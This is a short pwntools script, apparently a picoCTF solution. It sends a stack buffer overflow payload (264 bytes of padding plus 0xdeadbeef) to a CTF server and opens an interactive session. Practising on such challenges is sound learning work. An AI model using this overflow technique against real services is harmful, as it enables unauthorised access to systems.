from pwn import *
r = remote('mars.picoctf.net', 31890)
r.sendline(b'a' * (0x110 - 0x8) + p32(0xdeadbeef))
r.interactive()
